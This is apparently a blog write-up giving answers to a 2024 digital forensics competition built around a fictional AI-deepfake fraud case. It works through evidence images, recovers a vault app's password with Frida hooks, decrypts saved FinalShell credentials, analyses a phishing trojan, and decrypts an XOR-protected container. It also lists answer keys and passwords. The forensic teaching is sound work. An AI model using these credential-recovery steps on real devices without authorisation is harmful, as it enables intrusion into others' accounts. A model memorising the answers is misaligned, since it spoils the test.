---
title: 盘古石杯2024初赛题解
date: May 11, 2024
author: NoahTie & BlackBird @ 猫猫啥也不会ver2
tags:
- 电子取证
- wp
categories: 电子取证学习
description: 2024年第二届盘古石杯电子取证竞赛题解
---

# 2024年第二届盘古石杯电子取证竞赛初赛题解

> Author: NoahTie & BlackBird @ 猫猫啥也不会ver2
>
> 感谢上海弘连网络科技有限公司一直以来为西电电子数据取证提供的软件支持!
>

## 基本信息

> 本次比赛允许使用互联网环境.
> 

### 案情信息

> 容器"3D案情"中包含一个 UE4 制作的软件, 模拟现场勘察环节.
> 
> 除了以下案情信息和检材列表之外, 没有任何用处, 复盘时完全可以忽略这部分.
> 
> 3D案情容器密码: `盘古石杯晋级赛案情123！@#` (注意: 叹号为全角字符)
> 
> 账号: 11111111111
> 
> 密码: 111111
> 

2024 年 4 月 28 日 , xx 市 xx 路路派出所接到受害人支婉静(身份证号: 110101198103191406)报案称: 在 2024 年 4 月 24 日, 聊天软件 QQ 中收到一条新的好友申请, 对方声称是老同学向芬, 沟通过程中还说到一些之前的好友, 并且还了解她的家庭情况, 沟通中, 向芬了解到支女士生活遇到困难, 丈夫失业, 向支女士提供了一个投资收益较好的彩票平台, 支某在沟通中和向芬进行了 1 分钟的视频通话, 看着熟悉的脸, 就相信了"老同学", 并在向芬的指导下注册了平台, 并在平台投入了一万多, 前期还能提现, 后续就无法登录了. 支女士感觉到被骗了, 于是报警.

警方根据相关诈骗程序的后台和 QQ 的相关信息定位到"向芬", 在抓获"向芬"时发现, "向芬"本人和受害人手机中 QQ 空间中发现的"向芬"照片并不一致. 在"向芬"的电脑中发现大量 AI 生成的照片和视频. 其同伙通过在某即时通讯软件上购买网站源码进行搭建, 通过 AI 工具生成语音, 照片和视频对受害人进行欺骗.

### 检材清单

> 检材容器密码: `2b26ba7ed35d622d8ec19ad0322abc52160ddbfa`
> 

- 支婉婷(受害人)
    - 手机报告 (手机报告.zip)
- 义言(嫌疑人)
    - Android 手机镜像 (Pixel.zip)
    - Windows 计算机硬盘镜像 (PC.001)
    - Windows 计算机内存镜像 (memdump.mem)
- 伏季雅(嫌疑人)
    - Android 手机备份 (Samsung.zip)
    - Windows 计算机硬盘镜像 (PC.E01)
- 毛雪柳(嫌疑人)
    - iPhone 手机镜像 (iPhoneXR.zip)
    - Windows 计算机硬盘镜像 (PC.E01)
    - Windows 计算机内存镜像 (memdump.mem)
- 服务器
    - IM 服务器硬盘镜像 (IM.dd)
    - Web 服务器硬盘镜像 (Web.dd)

### 使用到的工具清单

#### 综合取证工具

- 火眼证据分析
- 盘古石手机取证分析系统
- X-Ways Forensics

#### 镜像仿真工具

- 火眼仿真取证

#### IDE / 文本编辑器 / Hex 编辑器

- VS Code
- Kate
- 010 Editor

#### 数据库工具

- DB Browser for SQLite
- Navicat
- pgAdmin 4
- Realm Studio

#### APK 分析工具

- 雷电 APP 智能分析
- Jadx
- Anlink

#### 二进制分析工具

- IDA Pro
- 安恒云沙箱
- Detect It Easy
- 火绒剑

#### 内存取证工具

- Volatility 3

#### 杂项

- PotPlayer
- CyberChief
- Root Explorer
- FinalShell 密码查看器(在线工具)
- WindTerm
- ChromeCacheView
- IrfanView

## 义言的检材

###  Android 手机

> 该部分对应原始题目"手机取证"部分的 9 - 17 题及"APK 取证"部分的 5 - 16 题.
> 
> 感谢陕西警官职业学院的几位朋友提供的第 6 - 9 题的解题思路及工具分享.
> 

#### 01 分析义言的手机检材, 手机中登录的谷歌邮箱账号是

在谷歌地图的自动取证结果里可以看到一个登陆的账号. 在谷歌云盘的账号信息中也能看到登陆了内部 ID 相同的账号.

![](./attachments/Pasted%20image%2020240511171819.png)

==`a2238346317@163.com`==

#### 02 分析义言的手机检材, 手机的 MTP 序列号是

> 手机的 MTP 序列号通常指的是设备的 MTP(Media Transfer Protocol)序列号, 这是 Android 设备上的一个唯一标识符, 在 Android 设备与电脑通过 USB 连接时生成的, 用于在 MTP 传输过程中标识设备. 
> 
> 在 Android 设备上,  MTP 序列号是设备标识的一部分, 它与设备的硬件和软件配置有关. 这个序列号是在设备启动时由操作系统生成的, 并且每次设备与电脑连接时都会更新. 
> 

需要查看检材压缩包里的文件 `Pixel.zip\Basic\Adlockdown.json`.

![](./attachments/Pasted%20image%2020240511172407.png)

==FA6A80312283==

#### 03 分析义言的手机检材, 除系统自带的浏览器外, 手机中安装了一款第三方浏览器, 该浏览器的应用名称是

在应用列表中可以看到.

![](./attachments/Pasted%20image%2020240511173014.png)

==悟空浏览器==

#### 04 接上题, 上述浏览器最后一次搜索的关键字是

定位到该应用的数据目录`/data/data/com.cat.readall/`, 查找其中的所有数据库, 其中文件大小最大的一个为 `/databases/news_article.db`. 也可以在火眼的分析中选取"耗时任务"中的"其它应用", 可以比较方便地找到应用数据文件夹中的全部数据库文件.

![](./attachments/Pasted%20image%2020240511173813.png)

表`search_word`中的记录即为搜索记录.

![](./attachments/Pasted%20image%2020240511173419.png)

在`\data\media\0\Android\data\com.cat.readall\files\Documents`目录下的`multi_windows.dat`中也可以看到保存的历史记录.

![](./attachments/Pasted%20image%2020240513103923.png)

奇安信的手机取证软件支持对悟空浏览器的自动取证, 可以相互印证. 

==ai写文章生成器==

#### 05 接上题, 该浏览器最后一次收藏的网址是

![](./attachments/image-20240512001017162.png)

这里应该是收藏的书签. 按照`behot_time`排序.

==`http://toutiao.com/a7361678286282490403`==

#### 06 分析义言的手机检材, 其所购买的公民信息数据, 该数据提供者的手机号码是

在截图文件夹`Pixel.tar/data/media/0/Pictures/Screenshots`中可以找到几张 Telegram 的聊天截图, 内容与买卖公民信息有关.

![](./attachments/Pasted%20image%2020240511215212.png)

可以看到用户的手机号码.

![](./attachments/Pasted%20image%2020240511215913.png)

==13265159824==

#### 07 接上题, 卖家的收款地址

![](./attachments/Pasted%20image%2020240511221013.png)

==bc1pvunxx2eytoljpzs9wp9tcrrdvssra97nnwls563hxpf3xm69zms3yak85==

#### 08 接上题, 购买上述公民信息, 义言一共支付了多少钱

![](./attachments/Pasted%20image%2020240511221158.png)

可以看到交易的哈希: `4630a72ad8e7339e553cdba67a1dc7d33716a1db0cf7b44ec281ae08ac6249f8`

用交易的哈希在区块链[查询网站](https://blockchair.com/)上查找以下交易信息:

![](./attachments/Pasted%20image%2020240511222351.png)

可以看到 SENDER 一栏中显示支付金额为 0.07364352 BTC.

==0.07364352 BTC==

#### 09 接上题, 该笔交易产生的手续费是多少

接上题, 在 RECIEVER 一栏最下方的 MINER FEE 中为手续费, 价格为 0.00010670 BTC.

==0.00010670 BTC==

#### 10 分析义言的手机检材, 分析团队内部使用的即时通讯软件, 该软件连接服务器的地址是

从计算机镜像和 IM 服务器镜像可以知道, 犯罪团队内部使用的即时通讯软件为 mattermost(). 在该应用的数据目录存放了软件的配置数据库`Pixel.tar/data/data/com.mattermost.rn/files/databases/app.db`和数据库 `Pixel.tar/data/data/com.mattermost.rn/files/databases/aHR0cDovLzE5Mi4xNjguMTM3Ljk3OjgwNjU=.db`. 

在`app.db`数据库的表 `Servers` 中可以看到一条服务器配置信息:

![](./attachments/Pasted%20image%2020240512205342.png)

对该数据库名称`aHR0cDovLzE5Mi4xNjguMTM3Ljk3OjgwNjU=`进行 Base64 解码:

![](./attachments/Pasted%20image%2020240512205020.png)

也可以看到服务器的 URL.

==192.168.137.97==

#### 11 接上题, 该软件存储聊天信息的数据库文件名称是

见上题.

==aHR0cDovLzE5Mi4xNjguMTM3Ljk3OjgwNjU=.db==

#### 12 接上题, 该即时通讯软件中, 团队内部沟通群中, 一共有多少个用户

在数据库`aHR0cDovLzE5Mi4xNjguMTM3Ljk3OjgwNjU=.db`中的表`ChannelMembership` 中可见频道(题目中称为"群")的所有成员:

![](./attachments/Pasted%20image%2020240512205808.png)

共计 4 个群组 id 和 4 个用户 id.

但是在表`Post`的`user_id`字段中存在 6 条不同的记录, 其中 2 个用户仅加入了频道, 但并未发送消息. 不在表`ChannelMembership`的原因可能是这两个用户进入频道之后又退出了, 表`ChannelMembership`中的记录被清除. 

![](./attachments/Pasted%20image%2020240512212046.png)

==4==

#### 13 接上题, 该即时通讯应用的版本号是

见 **10 分析义言的手机检材, 分析团队内部使用的即时通讯软件, 该软件连接服务器的地址是**. 在数据库`app.db`的表`Info`中保存了应用的基本信息, 字段`version_number`为版本信息.

![](./attachments/Pasted%20image%2020240512210030.png)

==2.15.0==

#### 14 接上题, 该即时通讯应用中, 团队内部沟通中曾发送了一个视频文件, 该视频文件发送者的用户名是

在数据库`aHR0cDovLzE5Mi4xNjguMTM3Ljk3OjgwNjU=.db`的表`File`中可以看到一条视频文件的记录, 其对应的`post_id`(消息 ID)为`hctctn8bnbd7meywjpmk3z9dhh`.

![](./attachments/Pasted%20image%2020240512210119.png)

在表`Post`中过滤字段`id`为上述消息 ID, 得到消息对应的`user_id`(用户 ID)为`jrmi9kx8pfg9drc7b9dczh7neo`.

![](./attachments/Pasted%20image%2020240512210238.png)

在表`User`中过滤字段`id`为上述用户 ID, 可以看到用户名.

![](./attachments/Pasted%20image%2020240512210359.png)

==yiyan==

#### 15 接上题, 分析该即时通讯的聊天记录, 团队购买了一个高性能显卡, 该显卡的显存大小是

接上题. 在表`Post`中可一看到一条消息内容为京东的商品连接, 查询之后发现为显卡.

![](./attachments/Pasted%20image%2020240512211123.png)

![](./attachments/Pasted%20image%2020240512211026.png)

过滤该频道(`channel_id`=`3muf9j8o97rbfy3k7b7wbz6ana`)的全部消息:

![](./attachments/Pasted%20image%2020240512211446.png)

顺便也看了一下其它几个频道的消息记录.

channel_id = dpqyctmqif8imjunikk3iqi8hy

![](./attachments/Pasted%20image%2020240512211632.png)

==24G==

#### 16 分析义言的手机检材, 手机中装有一个具备隐藏功能的 APP, 该 APP 启动设置了密码, 设置的密码长度是多少位

查看所有应用列表, 按照安装时间降序排序, 看到有一个"计算器"APP, 包名为"com.hld.anzenbokusufake", 第三段为日语的罗马字(安全ボックスfake), 猜测是伪装成计算器的保险箱应用.

![](./attachments/Pasted%20image%2020240513112443.png)

从检材中导出该应用的安装包, 在模拟器中安装. 运行后发现, 需要设置一个手势密码和一个密保问题. 

用 Jadx 解包之后发现程序的主要代码 com.hld.anzenbokusufake 包的全部代码的函数和变量名几乎都被混淆, 静态分析难度比较高.

使用雷电 APP 分析内建的 Frida 分析工具进行动态分析. 先安装 APP, 之后将检材中的两个 APP 的数据目录导入至模拟器. 

> 我在开启了 Hyper-V 的情况下, 可以相对流畅使用的模拟器有雷电模拟器 v9 和 Mumu 模拟器, 但后者在启动 Frida Hook 的时候进程会卡死.
> 
> 如果卡顿严重的话, 可以将模拟器的分辨率调低.
> 

可以使用雷电 APP 分析自带的文件导入功能. `/storage/emulated/0/.privacy_safe`文件夹可以正常导入, 但无法直接写入到`/data/data`目录, 因此需要先将`/data/data/com.hld.anzenbokusufake`导入到`/storage/emulated/0/`目录下, 然后用虚拟机内的文件管理器手动复制.

![](./attachments/Pasted%20image%2020240516130548.png)

![](./attachments/Pasted%20image%2020240516130646.png)

![](./attachments/Pasted%20image%2020240516130527.png)

导入之后, 在 Frida 脚本选项卡中运行字符串相等判断. 启动 APP 之后随便绘制一个手势密码(以从左到右, 从上到下的顺序依次连接为例), 会看到日志中显示将输入的手势密码与真实密码进行了比较.

![](./attachments/Pasted%20image%2020240516134208.png)

得到了手势密码:

![](./attachments/Pasted%20image%2020240516134448.png)

除此之外, 还可以用同样的方法获得密保问题的答案:

![](./attachments/Pasted%20image%2020240516140156.png)

接着也可以获得密码:

![](./attachments/Pasted%20image%2020240516140228.png)

密码长度为 ==9==.

#### 17 接上题, 分析上述隐藏功能的 APP, 一共隐藏了多少个应用

在打开应用后遇到提示 SQLite 文件读取失败, 检查之后发现是导入的文件权限存在问题, 使用 Root Explorer 将`.privacy_safe`文件夹的权限改为 777 即可.

![](./attachments/Pasted%20image%2020240516142827.png)

可以看到一共隐藏了 5 个应用程序.

![](./attachments/Pasted%20image%2020240516143015.png)

==5==

#### 18 接上题, 分析上述隐藏功能的 APP, 该 APP 一共加密了多少个文件

![](./attachments/Pasted%20image%2020240516143050.png)

==5==

#### 19 接上题, 分析上述隐藏功能的 APP, 该 APP 加密了一份含有公民隐私信息的文件, 该文件的原始名称是

见上题.

==公民信息.xlsx==

#### 20 分析义言的手机检材, 马伟的手机号码是

接上题. 在 APP 中恢复加密的 xlsx 文件并导出.

![](./attachments/Pasted%20image%2020240516143459.png)

==18921286666==

#### 21 分析义言的手机检材, 手机中存有一个 BitLocker 恢复密钥文件, 文件已被加密, 原始文件的 MD5 值是

导出加密的 BitLocker 恢复密钥文件并计算 MD5.

![](./attachments/Pasted%20image%2020240516143747.png)

可以得到 BitLocker 恢复密钥为 `337469-693121-682748-288772-440682-300223-203698-553124`. ^536a1e

==497f308f66173dcd946e9b6a732cd194==

### Windows 计算机

> 本部分题目对应原题的"计算机取证"部分中与义言相关的题目及"人工智能取证"部分.
> 
> 分区 11(D 盘)有 BitLocker 加密, 恢复密钥来源参见 **义言-Android-21题**.
> 

#### 01 分析义言的计算机检材, 计算机连接过的三星移动硬盘 T7 的序列号是

在分析结果的 基本信息 -> USB 设备信息 中可以看到.

![](./attachments/Pasted%20image%2020240516145542.png)

==X12720BR0SNWT6S==

#### 02 分析义言的计算机检材, 计算机的最后一次正常关机时间是

Windows 日志中将重启(Reboot)也记录为系统关闭事件(Shutdown Event), 而火眼的开关机时间分析结果取自 Windows 系统日志, 因此在火眼的分析结果中, 重启事件也被归类在关机(Poweroff)中.

![](./attachments/Pasted%20image%2020240516145726.png)

在 Windows 的日志中显示为:

![](./attachments/Pasted%20image%2020240516150152.png)

根据微软提供的系统关闭日志的文档, 可以看到对事件 ID 的定义如下:

> The list of the Windows event IDs, related to the system shutdown/reboot:
> 
> 1074  -  The system has been shutdown properly by a user or process.
> 

由于题目问到的"正常关机"应该是指"关闭计算机电源"而非"关闭系统", 因此, 该题的答案应为最后一次因关闭电源而导致系统关闭的时间.

==2024-04-26 11:34:19==

#### 03 分析义言的计算机检材, 曾经使用工具连接过数据库, 该数据库的密码是

分析结果中可以看到 Navicat 的连接记录.

![](./attachments/Pasted%20image%2020240516151511.png)

==root==

#### 04 分析义言的计算机检材, 计算机中安装的 xshell 软件的版本号是

在分析结果的可执行程序中可以看到 xshell 的版本号, 在 Xshell 官网的历史版本中可以通过 `7,0,0,40` 查找到对应的 build 号为 `Build 0157`.

![](./attachments/Pasted%20image%2020240516151832.png)

或者也可以仿真之后解锁 BitLocker, 再运行 D 盘中的 Xshell 查看属性.

==Build 0157==

#### 05 分析义言的计算机检材, 曾使用 shell 工具连接过服务器, 该服务器 root 用户的密码是

检材中的 Shell 工具有 Xshell 和 finnalshell. 由于 Xshell 的配置文件保存在用户文件夹中, 且未得到自动分析的结果, 因此可以判断保存了服务器用户配置的是 finnalshell.

在 finnalshell 的配置文件` PC.001/新加卷(分区11)/软件夹/finalshell/conn/xo9vwa30e6yw43wf/ek2pvnot3be8q722_connect_config.json` 中可以看到加密后的服务器密码(Des 加密)为 `BHMVVkAIPDY9bj4SKcO5sQ==`.

可以使用[查看FinalShell已保存密码](https://answer.uiucode.com/tools/finalshell)解密:

![](./attachments/Pasted%20image%2020240516152419.png)

或者使用[命令行获取Finalshell软件保存的公钥](https://github.com/0x783kb/Security-operation-book/blob/20b4c5db66cab988bf2af07b83f149753954e7e2/Windows/08%E5%87%AD%E8%AF%81%E8%AE%BF%E9%97%AE/T1555-005-win-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%8E%B7%E5%8F%96Finalshell%E8%BD%AF%E4%BB%B6%E4%BF%9D%E5%AD%98%E7%9A%84%E5%85%AC%E9%92%A5.md?plain=1#L83)解密:

![](./attachments/Pasted%20image%2020240516155527.png)

==root==

#### 06 分析义言的计算机检材, 计算机曾接收到一封钓鱼邮件, 该邮件发件人是

分析结果中 网易邮箱大师 -> 垃圾邮件 中存在一封伪装成 flash 官方的邮件, 附件为一个 zip 压缩包, 发件人为 `Unique <838299176@qq.com>`.

![](./attachments/Pasted%20image%2020240516155628.png)

==`838299176@qq.com`==

#### 07 接上题, 上述附件解压运行后, 文件的释放位置是

用安恒云沙箱一把梭.

![](./attachments/Pasted%20image%2020240516160702.png)

行为分析中的文件释放:

![](./attachments/Pasted%20image%2020240516160759.png)

==`C:\Windows\Temp\`==

#### 08 接上题, 恶意木马文件的 MD5 值是

见上题.

==f539aab0af03836e73ec1727db8a6d50==

#### 09 接上题, 恶意木马文件的回连 IP 地址是

![](./attachments/Pasted%20image%2020240516161015.png)

==192.168.137.77==

#### 10 分析义言的计算机检材, 计算机中保存的有隐写痕迹的文件名

在 D 盘的回收站中可以看到一个名为 `LSB_hide.exe` 的可执行文件:

![](./attachments/Pasted%20image%2020240516161929.png)

> 每个回收站中的文件在磁盘的 `$RECYCLE.BIN` 目录下存在 2 个对应的文件, 文件名分别为 `$Rxxxxxx.[ext]` 及 `$Ixxxxxx.[ext]`, 其中 `$R` 开头的文件为被删除的文件, `$I` 开头的文件为该文件的信息.
> 
> `$I` 开头的文件中以 UTF-16 编码存储着文件的原始路径.
> 

![](./attachments/Pasted%20image%2020240516162540.png)

导出测试一下, 发现该应用会将文件隐藏在图片文件中, 并生成一个 bmp 格式的图片文件, 且图片文件大小会显著增大(位图文件较大).

![](./attachments/Pasted%20image%2020240516163146.png)

在 D 盘的全部文件中搜索 .bmp 的扩展名, 发现只有一个文件(`PC.001/新加卷(分区11)/照片/a78bd8b5bec5f60380782bd674c7443p.bmp`)的大小看起来像是存在隐写:

![](./attachments/Pasted%20image%2020240516164156.png)

导出并使用 `LSB_hide.exe` 提取:

![](./attachments/Pasted%20image%2020240516164314.png)

提取得到的文件内容为 `RR%#CBSf7uYLQ#28bywT`.

在 D 盘中开启文件全显, 按照文件大小降序排列. 可以看到一个 mp3 文件大小正好是 2GB, 应该是 VC 容器.

![](./attachments/Pasted%20image%2020240517124334.png)

导出之后挂载, 再将挂载的磁盘添加为新检材.

==a78bd8b5bec5f60380782bd674c7443p.bmp==

#### 11 分析义言的计算机检材, 保存容器密码的文件大小是多少字节

见上题.

`a78bd8b5bec5f60380782bd674c7443p.bmp` 的大小为 20 字节.

==20==

#### 12 分析义言的计算机检材, 一共训练了多少个声音模型

![](./attachments/Pasted%20image%2020240517125313.png)

==13==

#### 13 分析义言的计算机检材, 声音模型 voice2, 一共训练了多少条声音素材

 `PC.001/新加卷(分区11)/GPT-SoVITS-beta0217/output/asr_opt/voice2.list` 为 voice2 模型输出音频切片的列表. 其中有 17 条.

![](./attachments/Pasted%20image%2020240517125513.png)

==17==

#### 14 分析义言的计算机检材, 声音模型 voice3, 一共训练了多少轮

模型训练日志在 ` PC.001/新加卷(分区11)/GPT-SoVITS-beta0217/logs/voice3/train.log`. 

![](./attachments/Pasted%20image%2020240517125844.png)

其中的 Epoch(代) 就是模型训练的轮次.

==8==

#### 15 分析义言的计算机检材, 声音克隆工具推理生成语音界面的监听端口是

`PC.001/新加卷(分区11)/GPT-SoVITS-beta0217/config.py` 文件包含 SoVITS 的配置, 其中`webui_port_infer_tts = 9872`一行代表的是推理生成语音界面的监听端口.

> infer(v. 推断, 推论；暗示, 暗指)
> 

也可以导出整个 SoVITS, 用`go-webui.ps1`运行, 然后在主 webui 中的推理选项卡里开启推理的 webui. 访问命令行输出的 log 中包含的 url:

![](./attachments/Pasted%20image%2020240517135833.png)

![](./attachments/Pasted%20image%2020240517135357.png)

> 出题人塞的这套东西还挺好用
> 
> ![](./attachments/tmpm_n2_kxp.wav]]
> 

==9872==

#### 16 分析义言的计算机检材, 电脑中视频文件有几个被换过脸

`PC.001/新加卷(分区11)/Rope-Opal-03a/output/11.mp4` 是一个换脸视频, 该目录是`Rope-Opal`的默认输出目录.

![](./attachments/Pasted%20image%2020240517143051.png)

在 **10 分析义言的计算机检材, 计算机中保存的有隐写痕迹的文件名** 中找的 VC 容器中也有视频文件. 视频被加密, 无法播放.

在不解密的情况下, 可以通过文件名大致分辨出来那些是换脸视频.

```powershell
USER:
你觉得以下文件中那些像是Rope-Opal生成的视频？
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         2024/4/25     17:33    18.25MB 07ab9b06f5419d679cbc2811e56953a9compress.06DCF9CF-6400-48AA-9A9A-F3BD4107DD13_1713951283-cn.mp4
-a---         2024/4/25     17:33    10.18MB 1623192705b64c2ede7e52c8bcdce94acompress.03F3F9BE-9D75-4692-809B-7EDF8968036E_1713948469-cn.mp4
-a---         2024/4/25     17:33    10.61MB 1bd6d9c9edbc8d82857549dc9137d7cccompress.854E19D5-DF25-42ED-8D26-0F7B457C41CF_1713948517-cn.mp4
-a---         2024/4/25     17:34    17.40MB 20240424-01_1713942222-cn.mp4
-a---         2024/4/25     17:34    15.85MB 20240424-02_1713942257-cn.mp4
-a---         2024/4/25     17:34    17.50MB 20240424-03_1713942287-cn.mp4
-a---         2024/4/25     17:34    19.13MB 20240424-04_1713942308-cn.mp4
-a---         2024/4/25     17:34    20.87MB 20240424-05_1713942331-cn.mp4
-a---         2024/4/25     17:34    16.87MB 20240424-06_1713942359-cn.mp4
-a---         2024/4/25     17:34     8.28MB 20240424-08_1713942556-cn.mp4
-a---         2024/4/25     17:34     4.56MB 20240424-09_1713942594-cn.mp4
-a---         2024/4/25     17:34     3.38MB 20240424-10_1713942615-cn.mp4
-a---         2024/4/25     17:34     8.20MB 20240424-11_1713942637-cn.mp4
-a---         2024/4/25     17:34     9.41MB 20240424-12_1713942664-cn.mp4
-a---         2024/4/25     17:34    25.51MB 238580f649a0b60d178817bdce583348compress.9BE723BC-E798-4BC0-ADCC-621C9561D80F_1713951346-cn.mp4
-a---         2024/4/25     17:34     9.64MB 2b267a7dd460dc37b90d546c08fc09e9compress.580605D4-613B-415C-851A-F8AD2FB94D06_1713948552-cn.mp4
-a---         2024/4/25     17:34    21.81MB 38e6a133ed88d1885a6bc1b3bbf56e51compress.C2C2798F-168B-4586-98C8-0EDAD15178C8_1713951519-cn.mp4
-a---         2024/4/25     17:34     5.90MB 4126918b3253aa84a4e49a51573fb305compress.2AF8BB97-C226-4E78-B60D-797EE560D59C_1713948648-cn.mp4
-a---         2024/4/25     17:34     7.75MB 4747695c89e014db7c127470d7c6a3f4origin.3FD3C372-7BDF-4AC8-931F-B01D5414BA05_1713948678-cn.mp4
-a---         2024/4/25     17:34     7.18MB 4d35591dad3576bf2ef50c4003a4ff32compress.C9D4AA01-AF98-4009-A8A6-D4EFA024B044_1713951647-cn.mp4
-a---         2024/4/25     17:34    28.08MB 4d40ff034ecf0f0ea920bc20478e6ca9compress.F6E91F3D-C8D9-48B9-BE54-F80619C58103_1713951719-cn.mp4
-a---         2024/4/25     17:34     6.07MB 543dc8db9767db8011c5531cbc729a8aorigin.9446AB34-6029-4941-B229-A24287B464EB_1713948724-cn.mp4
-a---         2024/4/25     17:34    12.23MB 56385ed51c4a1bd9291f2a870d6a2cfacompress.F8B588A3-13CC-4190-A011-885F76508F1A_1713951975-cn.mp4
-a---         2024/4/25     17:34    15.71MB 5b789f99dda7a1f9b52de5a2fb6fc468compress.A9FAF3E2-CC5A-472E-97DB-185356355A42_1713952114-cn.mp4
-a---         2024/4/25     17:34     5.81MB 75c92a136ca30b61eeeebd58c498e42fcompress.57F4F08D-A44E-4083-A2C6-0C5CEF282FDC_1713952302-cn.mp4
-a---         2024/4/25     17:34     7.71MB 761ef91c8cc4de487a92a11dae550708compress.DF4875A0-63D6-4532-9FEC-0AFF11F0A97A_1713948762-cn.mp4
-a---         2024/4/25     17:34     3.10MB 7f8e743dafe3856edf5a950df0875ba1compress.A196670D-67B1-42B8-A1F9-36766D5E7B35_1713952366-cn.mp4
-a---         2024/4/25     17:34     1.04MB 7f8e743dafe3856edf5a950df0875ba1compress.A196670D-67B1-42B8-A1F9-36766D5E7B35_1713952385_temp-cn.mp4
-a---         2024/4/25     17:34     7.45MB 8094a4e328840ece0ca6e470837c3627compress.59C46DBD-4BBF-4625-82FB-CF4C42A13DCD_1713952463-cn.mp4
-a---         2024/4/25     17:35    94.57MB 8c719c79a1ac1072fbced3bd0ac061ecorigin.E8F43316-5926-47F5-A230-FDFC62FD7572_1713955293-cn.mp4
-a---         2024/4/25     17:35     2.36MB 92e282fd72070c45739b647ea91e8868compress.5C88F476-19B9-4DD6-93EC-6518DF544EDF_1713952506-cn.mp4
-a---         2024/4/25     17:35     4.16MB 946aa63979e0a3a843e5f95ae495d814compress.DEF10F9C-BC06-49E3-AA74-54998C703A33_1713952708-cn.mp4
-a---         2024/4/25     17:35    22.06MB 9ad055b35d5b22e9e91a169872e2b68fcompress.EB2BF4C3-6BD0-4821-AEB2-C1DBF3643C6F_1713948817-cn.mp4
-a---         2024/4/25     17:35    12.09MB ab57e8639cd2c86710644c5ec0c0f5b7compress.C4079B3A-C2F7-46A3-B2D9-DDA12DB6B029_1713952729-cn.mp4
-a---         2024/4/25     17:35     7.63MB b29cbcefa5c11b0896ee21c2da430b13compress.9D91F003-093A-472A-B863-BC292CD93F93-cn.mp4
-a---         2024/4/25     17:35     5.20MB b3aa4b0b172774b29a4873d3c3ad3e19compress.07478FC5-F7D7-413E-B008-E48A0F1D6F46_1713952873-cn.mp4
-a---         2024/4/25     17:35     3.47MB bb774c91aba43cbacd27ea942c00b866compress.3BB381BF-A872-46EC-81BA-0ED06879E6B1-cn.mp4
-a---         2024/4/25     17:35     5.36MB bd62e622198f5cf39f38b3d5861344a5compress.D1EA14C9-03CB-46EC-9A75-EF0CF30B1A51-cn.mp4
-a---         2024/4/25     17:35     1.06MB c1e6adf1e90c8c65a9177751480ee5c8compress.CD5151D6-D238-44F8-A3CB-83B0D4046FCA-cn.mp4
-a---         2024/4/25     17:35     6.46MB c2cb1553c5f9803513a19129b36d3ca5compress.E1B5C708-8E53-41A2-8DE4-DBFCF016B65E-cn.mp4
-a---         2024/4/25     17:35     1.35MB f22e82b22e42c6c06e26c449cbe2ebfccompress.94B2BE54-DED7-4163-95B5-CB758A1329B2-cn.mp4

ChatGPT:
根据文件名和大小, 像是Rope-Opal生成的视频通常包含有较长的、复杂的文件名, 并且大小会相对较小, 因为经过压缩处理. 以下文件看起来像是由Rope-Opal生成的: 

[Snip]

这些文件的特征是有随机生成的长字符串, 文件名中带有“compress”字样, 并且大小在10到30MB之间, 符合Rope-Opal生成视频的典型特征. 
```

在 `PC.001/新加卷(分区11)/软件夹/encrypt.exe` 可以找到疑似加密程序的可执行文件. 导出之后根据图标可以判断出来是 pyinstaller 打包的 python 脚本.

![](./attachments/Pasted%20image%2020240517144959.png)

![](./attachments/Pasted%20image%2020240517145043.png)

![](./attachments/Pasted%20image%2020240517145204.png)

可以比较容易地看出存在周期, 周期最大为 16 字节. 并且, 输入的均为不可见字符, 输出均为可见字符, 大概率是某种异或算法.

![](./attachments/Pasted%20image%2020240517145544.png)

可以明显看到使用异或加密, 密钥为 `\116\101\115\116`. 对 ASCII 码稍微熟悉一点的话, 可以看出来是四个可见字符, 转成字符得到密钥 `test`. 

![](./attachments/Pasted%20image%2020240517145748.png)

测试使用的文件名为 test, 猜测异或加密使用源文件名作为密钥. 而加密后的文件会被在文件末尾添加上`-cn`. 因此, 只需要复制被加密的视频, 将文件中的`-cn`删除, 再运行一次加密即可解密.

![](./attachments/Pasted%20image%2020240517150839.png)

![](./attachments/Pasted%20image%2020240517151038.png)

使用 PotPlayer 的批量创建缩略图功能, 生成全部视频的缩略图. 

> - 将要生成缩略图的视频添加到 PotPlayer 的播放列表.
> - 选择播放列表的所有视频.
> - 右键 -> 创建缩略图.
> 

大致浏览一下缩略图(重点是文件名不带`[hash]compress`格式字符串的几个文件), 可以判断这些全部都是换脸后的视频.

![](./attachments/Pasted%20image%2020240517151616.png)

因此一共 1 + 41 个换脸后的视频. 

==42==

#### 17 分析义言的计算机检材, 换脸 AI 程序默认换脸视频文件名是

在软件的根目录存在一个 `videos` 文件夹, 是默认的输入视频文件夹, 其中的 `target-1080p.mp4` 是该软件自带的示例视频.

==target-1080p.mp4==

#### 18 分析义言的计算机检材, 换脸 AI 程序默认换脸图片的文件名称

在软件的根目录存在一个 `faces` 文件夹, 是默认的输入图片文件夹, 其中存在一个图片文件 `fc3d6cb14c0d4e52adcf8717f2740b5c.jpeg`.

==fc3d6cb14c0d4e52adcf8717f2740b5c.jpeg==

#### 19 分析义言的计算机检材, 换脸 AI 程序模型文件数量是多少个

在软件的根目录存在一个 `models` 文件夹, 是存放模型的文件夹, 其中存在 15 个模型文件.

==15==

### Windows 计算机内存

#### 01 分析义言的计算机内存检材, 该内存镜像制作时间(UTC+8)是

```shell
python vol3.py -f "Z:\嫌疑人\义言\计算机\memdump.mem" windows.info
```

![](./attachments/Pasted%20image%2020240511141058.png)

此处显示的时间为 UTC 时间.

==2024-04-25 22:18:56==

#### 02 分析义言的计算机内存检材, navicat.exe 的进程 ID 是

```shell
python vol3.py -f "Z:\嫌疑人\义言\计算机\memdump.mem" windows.pslist
```

![](./attachments/Pasted%20image%2020240511141146.png)

==9336==

## 伏季雅的检材

### Android 手机

每一个手机检材都会有`Adlockdown.json`和`deviceinfo.json`两个文件, 这两个文件应该是由取检材软件生成的, 因此我们在取证过程中尽量不使用两个文件中的内容. 除了MTP序列号在`/sys/class/android_usb/android0/iSerial` 文件中, 并不在检材中, 我们只能从这两个文件中获得信息. 

#### 01 分析伏季雅的手机检材, 手机的安卓 ID 是

> AndroidID 是 Android 设备上用于标识设备的一个独特字符串, 它是由系统生成的一个 64 位的十六进制数字. AndroidID 主要用于广告跟踪和应用程序分析, 以便于识别用户和设备. 
>
> AndroidID 的生成基于设备的硬件信息, 如 IMEI（国际移动设备身份码）和 Wi-Fi MAC 地址等, 但它并不是永久不变的. 在以下情况下, AndroidID 可能会改变: 
